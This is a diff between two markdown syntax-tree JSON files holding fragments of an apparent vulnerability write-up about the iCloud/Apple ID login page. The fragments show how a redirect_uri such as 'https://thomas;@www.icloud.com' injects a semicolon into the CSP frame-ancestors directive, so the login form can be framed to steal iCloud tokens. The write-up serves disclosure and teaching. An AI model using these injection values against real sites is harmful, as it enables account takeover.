<           "type": "text",
<           "value": "Since Apple ",
<           "position": {
<             "start": {
<               "line": 398,
<               "column": 1,
<               "offset": 19591
<             },
<             "end": {
<               "line": 398,
<               "column": 13,
<               "offset": 19603
7203,7208d15486
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
7210,7211c15488,15575
<               "type": "text",
<               "value": "validated",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Now we have a sneaky way to push data to ",
>                   "position": {
>                     "start": {
>                       "line": 991,
>                       "column": 1,
>                       "offset": 47764
>                     },
>                     "end": {
>                       "line": 991,
>                       "column": 42,
>                       "offset": 47805
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 991,
>                       "column": 42,
>                       "offset": 47805
>                     },
>                     "end": {
>                       "line": 991,
>                       "column": 59,
>                       "offset": 47822
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " without getting checked by the access control list. But how do we receive messages without being ",
>                   "position": {
>                     "start": {
>                       "line": 991,
>                       "column": 59,
>                       "offset": 47822
>                     },
>                     "end": {
>                       "line": 991,
>                       "column": 157,
>                       "offset": 47920
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 991,
>                       "column": 157,
>                       "offset": 47920
>                     },
>                     "end": {
>                       "line": 991,
>                       "column": 169,
>                       "offset": 47932
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "?",
>                   "position": {
>                     "start": {
>                       "line": 991,
>                       "column": 169,
>                       "offset": 47932
>                     },
>                     "end": {
>                       "line": 991,
>                       "column": 170,
>                       "offset": 47933
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
7214,7216c15578,15580
<                   "line": 398,
<                   "column": 14,
<                   "offset": 19604
---
>                   "line": 991,
>                   "column": 1,
>                   "offset": 47764
7219,7221c15583,15585
<                   "line": 398,
<                   "column": 23,
<                   "offset": 19613
---
>                   "line": 991,
>                   "column": 170,
>                   "offset": 47933
7225,7248d15588
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 398,
<               "column": 13,
<               "offset": 19603
<             },
<             "end": {
<               "line": 398,
<               "column": 24,
<               "offset": 19614
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " rather than transforming, the URL met their criteria for\nwhat a 'safe' URL looked like and passed through. But -- based on my tests,\nApple definitely actually ",
<           "position": {
<             "start": {
<               "line": 398,
<               "column": 24,
<               "offset": 19614
7250,7263d15589
<             "end": {
<               "line": 400,
<               "column": 27,
<               "offset": 19776
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
7265,7266c15591,15867
<               "type": "text",
<               "value": "checks and validates",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I noticed via live debugging that the origin that ",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 1,
>                       "offset": 47937
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 51,
>                       "offset": 47987
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 51,
>                       "offset": 47987
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 68,
>                       "offset": 48004
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " was sending messages to was ",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 68,
>                       "offset": 48004
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 97,
>                       "offset": 48033
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "not",
>                       "position": {
>                         "start": {
>                           "line": 993,
>                           "column": 98,
>                           "offset": 48034
>                         },
>                         "end": {
>                           "line": 993,
>                           "column": 101,
>                           "offset": 48037
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 97,
>                       "offset": 48033
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 102,
>                       "offset": 48038
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " ",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 102,
>                       "offset": 48038
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 103,
>                       "offset": 48039
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 103,
>                       "offset": 48039
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 115,
>                       "offset": 48051
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", but the full ",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 115,
>                       "offset": 48051
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 130,
>                       "offset": 48066
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 130,
>                       "offset": 48066
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 144,
>                       "offset": 48080
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", ",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 144,
>                       "offset": 48080
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 146,
>                       "offset": 48082
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://*;@icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 146,
>                       "offset": 48082
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 169,
>                       "offset": 48105
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". This is a super odd one because ",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 169,
>                       "offset": 48105
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 203,
>                       "offset": 48139
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 203,
>                       "offset": 48139
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 216,
>                       "offset": 48152
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is specified",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 216,
>                       "offset": 48152
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 229,
>                       "offset": 48165
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "footnoteReference",
>                   "identifier": "1",
>                   "label": "1",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 229,
>                       "offset": 48165
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 233,
>                       "offset": 48169
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " like this:",
>                   "position": {
>                     "start": {
>                       "line": 993,
>                       "column": 233,
>                       "offset": 48169
>                     },
>                     "end": {
>                       "line": 993,
>                       "column": 244,
>                       "offset": 48180
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
7269,7271c15870,15872
<                   "line": 400,
<                   "column": 28,
<                   "offset": 19777
---
>                   "line": 993,
>                   "column": 1,
>                   "offset": 47937
7274,7276c15875,15877
<                   "line": 400,
<                   "column": 48,
<                   "offset": 19797
---
>                   "line": 993,
>                   "column": 244,
>                   "offset": 48180
7280,7378d15880
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 400,
<               "column": 27,
<               "offset": 19776
<             },
<             "end": {
<               "line": 400,
<               "column": 49,
<               "offset": 19798
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " the origin of the submitted\n",
<           "position": {
<             "start": {
<               "line": 400,
<               "column": 49,
<               "offset": 19798
<             },
<             "end": {
<               "line": 401,
<               "column": 1,
<               "offset": 19828
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 401,
<               "column": 1,
<               "offset": 19828
<             },
<             "end": {
<               "line": 401,
<               "column": 15,
<               "offset": 19842
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 401,
<               "column": 15,
<               "offset": 19842
<             },
<             "end": {
<               "line": 401,
<               "column": 16,
<               "offset": 19843
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 398,
<           "column": 1,
<           "offset": 19591
<         },
<         "end": {
<           "line": 401,
<           "column": 16,
<           "offset": 19843
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If, instead of deciding if the URL is good or not, they instead ",
<           "position": {
<             "start": {
<               "line": 403,
<               "column": 1,
<               "offset": 19847
7380,7383c15882,15902
<             "end": {
<               "line": 403,
<               "column": 65,
<               "offset": 19911
---
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "targetWindow.postMessage(message, targetOrigin, [transfer]);",
>               "position": {
>                 "start": {
>                   "line": 995,
>                   "column": 1,
>                   "offset": 48184
>                 },
>                 "end": {
>                   "line": 997,
>                   "column": 4,
>                   "offset": 48264
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
7385,7390d15903
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
7392,7393c15905,15981
<               "type": "text",
<               "value": "also",
---
>               "type": "footnoteDefinition",
>               "identifier": "1",
>               "label": "1",
>               "children": [
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "link",
>                       "title": null,
>                       "url": "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage",
>                           "position": {
>                             "start": {
>                               "line": 999,
>                               "column": 7,
>                               "offset": 48274
>                             },
>                             "end": {
>                               "line": 999,
>                               "column": 74,
>                               "offset": 48341
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 999,
>                           "column": 7,
>                           "offset": 48274
>                         },
>                         "end": {
>                           "line": 999,
>                           "column": 74,
>                           "offset": 48341
>                         },
>                         "indent": []
>                       }
>                     },
>                     {
>                       "type": "text",
>                       "value": " \"Window.postMessage() - Web APIs | MDN\"",
>                       "position": {
>                         "start": {
>                           "line": 999,
>                           "column": 74,
>                           "offset": 48341
>                         },
>                         "end": {
>                           "line": 999,
>                           "column": 114,
>                           "offset": 48381
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 999,
>                       "column": 7,
>                       "offset": 48274
>                     },
>                     "end": {
>                       "line": 999,
>                       "column": 114,
>                       "offset": 48381
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
7396,7398c15984,15986
<                   "line": 403,
<                   "column": 66,
<                   "offset": 19912
---
>                   "line": 999,
>                   "column": 1,
>                   "offset": 48268
7401,7403c15989,15991
<                   "line": 403,
<                   "column": 70,
<                   "offset": 19916
---
>                   "line": 999,
>                   "column": 114,
>                   "offset": 48381
7407,9018d15994
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 403,
<               "column": 65,
<               "offset": 19911
<             },
<             "end": {
<               "line": 403,
<               "column": 71,
<               "offset": 19917
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " extracted\nwhich part they thought was good (",
<           "position": {
<             "start": {
<               "line": 403,
<               "column": 71,
<               "offset": 19917
<             },
<             "end": {
<               "line": 404,
<               "column": 35,
<               "offset": 19963
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://icloud.com",
<           "position": {
<             "start": {
<               "line": 404,
<               "column": 35,
<               "offset": 19963
<             },
<             "end": {
<               "line": 404,
<               "column": 55,
<               "offset": 19983
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ") then I wouldn't be able\nto inject characters here. I think of this as 'baking in' our understanding of\nwhat a URL looks like and forcing it conform to that understanding.",
<           "position": {
<             "start": {
<               "line": 404,
<               "column": 55,
<               "offset": 19983
<             },
<             "end": {
<               "line": 406,
<               "column": 68,
<               "offset": 20157
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 403,
<           "column": 1,
<           "offset": 19847
<         },
<         "end": {
<           "line": 406,
<           "column": 68,
<           "offset": 20157
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "Content Insecurity Policy {#content_insecurity_policy}",
<           "position": {
<             "start": {
<               "line": 408,
<               "column": 1,
<               "offset": 20161
<             },
<             "end": {
<               "line": 408,
<               "column": 55,
<               "offset": 20215
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 408,
<           "column": 1,
<           "offset": 20161
<         },
<         "end": {
<           "line": 409,
<           "column": 26,
<           "offset": 20242
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "content insecurity policy",
<       "label": "Content Insecurity Policy",
<       "title": null,
<       "url": "#content_insecurity_policy",
<       "position": {
<         "start": {
<           "line": 411,
<           "column": 1,
<           "offset": 20246
<         },
<         "end": {
<           "line": 411,
<           "column": 56,
<           "offset": 20301
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§4",
<       "label": "§4",
<       "title": null,
<       "url": "#content_insecurity_policy",
<       "position": {
<         "start": {
<           "line": 412,
<           "column": 1,
<           "offset": 20303
<         },
<         "end": {
<           "line": 412,
<           "column": 33,
<           "offset": 20335
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "With the knowledge that I could sneak extra characters into the\n",
<           "position": {
<             "start": {
<               "line": 414,
<               "column": 1,
<               "offset": 20339
<             },
<             "end": {
<               "line": 415,
<               "column": 1,
<               "offset": 20404
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 415,
<               "column": 1,
<               "offset": 20404
<             },
<             "end": {
<               "line": 415,
<               "column": 18,
<               "offset": 20421
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " directive that validates who can embed the iCloud (really\nApple ID) login form, I, well, immediately tried to inject something that would\nbreak and/or change the action of ",
<           "position": {
<             "start": {
<               "line": 415,
<               "column": 18,
<               "offset": 20421
<             },
<             "end": {
<               "line": 417,
<               "column": 35,
<               "offset": 20596
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 417,
<               "column": 35,
<               "offset": 20596
<             },
<             "end": {
<               "line": 417,
<               "column": 52,
<               "offset": 20613
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 417,
<               "column": 52,
<               "offset": 20613
<             },
<             "end": {
<               "line": 417,
<               "column": 53,
<               "offset": 20614
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 414,
<           "column": 1,
<           "offset": 20339
<         },
<         "end": {
<           "line": 417,
<           "column": 53,
<           "offset": 20614
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Let's try:",
<           "position": {
<             "start": {
<               "line": 419,
<               "column": 1,
<               "offset": 20618
<             },
<             "end": {
<               "line": 419,
<               "column": 11,
<               "offset": 20628
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 419,
<           "column": 1,
<           "offset": 20618
<         },
<         "end": {
<           "line": 419,
<           "column": 11,
<           "offset": 20628
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "redirect_uri=https://thomas;@www.icloud.com",
<       "position": {
<         "start": {
<           "line": 421,
<           "column": 1,
<           "offset": 20632
<         },
<         "end": {
<           "line": 423,
<           "column": 4,
<           "offset": 20685
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This should be a totally valid HTTP Simple Authentication URL with the username\n",
<           "position": {
<             "start": {
<               "line": 425,
<               "column": 1,
<               "offset": 20689
<             },
<             "end": {
<               "line": 426,
<               "column": 1,
<               "offset": 20770
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "thomas;",
<           "position": {
<             "start": {
<               "line": 426,
<               "column": 1,
<               "offset": 20770
<             },
<             "end": {
<               "line": 426,
<               "column": 10,
<               "offset": 20779
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", but ",
<           "position": {
<             "start": {
<               "line": 426,
<               "column": 10,
<               "offset": 20779
<             },
<             "end": {
<               "line": 426,
<               "column": 16,
<               "offset": 20785
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": ";",
<           "position": {
<             "start": {
<               "line": 426,
<               "column": 16,
<               "offset": 20785
<             },
<             "end": {
<               "line": 426,
<               "column": 19,
<               "offset": 20788
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is an important character in ",
<           "position": {
<             "start": {
<               "line": 426,
<               "column": 19,
<               "offset": 20788
<             },
<             "end": {
<               "line": 426,
<               "column": 49,
<               "offset": 20818
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "Content-Security-Policy",
<           "position": {
<             "start": {
<               "line": 426,
<               "column": 49,
<               "offset": 20818
<             },
<             "end": {
<               "line": 426,
<               "column": 74,
<               "offset": 20843
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " as it\nis used to mark the end of each policy segment, for example:",
<           "position": {
<             "start": {
<               "line": 426,
<               "column": 74,
<               "offset": 20843
<             },
<             "end": {
<               "line": 427,
<               "column": 61,
<               "offset": 20911
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 425,
<           "column": 1,
<           "offset": 20689
<         },
<         "end": {
<           "line": 427,
<           "column": 61,
<           "offset": 20911
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTTP",
<       "meta": null,
<       "value": "Content-Security-Policy: default-src https://google.com; frame-ancestors https://mywebsite2.com",
<       "position": {
<         "start": {
<           "line": 429,
<           "column": 1,
<           "offset": 20915
<         },
<         "end": {
<           "line": 431,
<           "column": 4,
<           "offset": 21025
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This Content Security Policy dictates that valid resources can only be loaded\nfrom the HTTP origin ",
<           "position": {
<             "start": {
<               "line": 433,
<               "column": 1,
<               "offset": 21029
<             },
<             "end": {
<               "line": 434,
<               "column": 22,
<               "offset": 21129
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://google.com",
<           "position": {
<             "start": {
<               "line": 434,
<               "column": 22,
<               "offset": 21129
<             },
<             "end": {
<               "line": 434,
<               "column": 42,
<               "offset": 21149
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", and that this page can only be\nembedded by ",
<           "position": {
<             "start": {
<               "line": 434,
<               "column": 42,
<               "offset": 21149
<             },
<             "end": {
<               "line": 435,
<               "column": 13,
<               "offset": 21195
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 435,
<               "column": 13,
<               "offset": 21195
<             },
<             "end": {
<               "line": 435,
<               "column": 37,
<               "offset": 21219
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 435,
<               "column": 37,
<               "offset": 21219
<             },
<             "end": {
<               "line": 435,
<               "column": 38,
<               "offset": 21220
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 433,
<           "column": 1,
<           "offset": 21029
<         },
<         "end": {
<           "line": 435,
<           "column": 38,
<           "offset": 21220
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I digressed: what actually happens? Check it out:",
<           "position": {
<             "start": {
<               "line": 437,
<               "column": 1,
<               "offset": 21224
<             },
<             "end": {
<               "line": 437,
<               "column": 50,
<               "offset": 21273
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 437,
<           "column": 1,
<           "offset": 21224
<         },
<         "end": {
<           "line": 437,
<           "column": 50,
<           "offset": 21273
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTTP",
<       "meta": null,
<       "value": "Content-Security-Policy: frame-ancestors https://thomas;@www.icloud.com",
<       "position": {
<         "start": {
<           "line": 439,
<           "column": 1,
<           "offset": 21277
<         },
<         "end": {
<           "line": 441,
<           "column": 4,
<           "offset": 21362
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "That's gotta break something, right? Correct. The Google Chrome console tells\nme, helpfully:",
<           "position": {
<             "start": {
<               "line": 443,
<               "column": 1,
<               "offset": 21366
<             },
<             "end": {
<               "line": 444,
<               "column": 15,
<               "offset": 21459
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 443,
<           "column": 1,
<           "offset": 21366
<         },
<         "end": {
<           "line": 444,
<           "column": 15,
<           "offset": 21459
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "Unrecognised Content-Security-Policy directive '@www.icloud.com'",
<       "position": {
<         "start": {
<           "line": 446,
<           "column": 1,
<           "offset": 21463
<         },
<         "end": {
<           "line": 448,
<           "column": 4,
<           "offset": 21537
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This means the browser now thinks a valid origin to embed the iCloud\nathentication dialog at ",
<           "position": {
<             "start": {
<               "line": 450,
<               "column": 1,
<               "offset": 21541
<             },
<             "end": {
<               "line": 451,
<               "column": 25,
<               "offset": 21635
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 451,
<               "column": 25,
<               "offset": 21635
<             },
<             "end": {
<               "line": 451,
<               "column": 42,
<               "offset": 21652
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is ",
<           "position": {
<             "start": {
<               "line": 451,
<               "column": 42,
<               "offset": 21652
<             },
<             "end": {
<               "line": 451,
<               "column": 46,
<               "offset": 21656
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://thomas",
<           "position": {
<             "start": {
<               "line": 451,
<               "column": 46,
<               "offset": 21656
<             },
<             "end": {
<               "line": 451,
<               "column": 62,
<               "offset": 21672
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 451,
<               "column": 62,
<               "offset": 21672
<             },
<             "end": {
<               "line": 451,
<               "column": 63,
<               "offset": 21673
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 450,
<           "column": 1,
<           "offset": 21541
<         },
<         "end": {
<           "line": 451,
<           "column": 63,
<           "offset": 21673
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If you want to replicate this moment as I experienced it, close your eyes;\nimagine yourself really sick with flu and say 'fuck. oh my god. what the fuck.'.\nNow you understand.",
<           "position": {
<             "start": {
<               "line": 453,
<               "column": 1,
<               "offset": 21677
<             },
<             "end": {
<               "line": 455,
<               "column": 20,
<               "offset": 21854
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 453,
<           "column": 1,
<           "offset": 21677
<         },
<         "end": {
<           "line": 455,
<           "column": 20,
<           "offset": 21854
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Alright. I realise I forgot to tell you to open your eyes again. If they're\nstill closed you should open them.",
<           "position": {
<             "start": {
<               "line": 457,
<               "column": 1,
<               "offset": 21858
<             },
<             "end": {
<               "line": 458,
<               "column": 35,
<               "offset": 21969
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 457,
<           "column": 1,
<           "offset": 21858
<         },
<         "end": {
<           "line": 458,
<           "column": 35,
<           "offset": 21969
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Next step: embed the iCloud login page in our page and pretend to be iCloud\n(easy right?) if we can do this, we should just be able to steal the icloud\ntoken it returns.",
<           "position": {
<             "start": {
<               "line": 460,
<               "column": 1,
<               "offset": 21973
<             },
<             "end": {
<               "line": 462,
<               "column": 18,
<               "offset": 22144
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 460,
<           "column": 1,
<           "offset": 21973
<         },
<         "end": {
<           "line": 462,
<           "column": 18,
<           "offset": 22144
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Going from this to having an actual ",
<           "position": {
<             "start": {
<               "line": 464,
<               "column": 1,
<               "offset": 22148
<             },
<             "end": {
<               "line": 464,
<               "column": 37,
<               "offset": 22184
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 464,
<               "column": 37,
<               "offset": 22184
<             },
<             "end": {
<               "line": 464,
<               "column": 51,
<               "offset": 22198
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " we can use takes quite a bit\nof doing since Apple is so stringent on the characters we're allowed to use.\nTypically, we'd just send ",
<           "position": {
<             "start": {
<               "line": 464,
<               "column": 51,
<               "offset": 22198
<             },
<             "end": {
<               "line": 466,
<               "column": 27,
<               "offset": 22333
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": " '*'",
<           "position": {
<             "start": {
<               "line": 466,
<               "column": 27,
<               "offset": 22333
<             },
<             "end": {
<               "line": 466,
<               "column": 33,
<               "offset": 22339
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " to tell ",
<           "position": {
<             "start": {
<               "line": 466,
<               "column": 33,
<               "offset": 22339
<             },
<             "end": {
<               "line": 466,
<               "column": 42,
<               "offset": 22348
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 466,
<               "column": 42,
<               "offset": 22348
<             },
<             "end": {
<               "line": 466,
<               "column": 59,
<               "offset": 22365
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " anything is OK to\nembed this page, but ",
<           "position": {
<             "start": {
<               "line": 466,
<               "column": 59,
<               "offset": 22365
<             },
<             "end": {
<               "line": 467,
<               "column": 22,
<               "offset": 22406
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "'",
<           "position": {
<             "start": {
<               "line": 467,
<               "column": 22,
<               "offset": 22406
<             },
<             "end": {
<               "line": 467,
<               "column": 25,
<               "offset": 22409
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is disallowed. Instead we'll try to make ",
<           "position": {
<             "start": {
<               "line": 467,
<               "column": 25,
<               "offset": 22409
<             },
<             "end": {
<               "line": 467,
<               "column": 67,
<               "offset": 22451
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://*",
<           "position": {
<             "start": {
<               "line": 467,
<               "column": 67,
<               "offset": 22451
<             },
<             "end": {
<               "line": 467,
<               "column": 78,
<               "offset": 22462
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ",\nwhich means 'any website over HTTPS.",
<           "position": {
<             "start": {
<               "line": 467,
<               "column": 78,
<               "offset": 22462
<             },
<             "end": {
<               "line": 468,
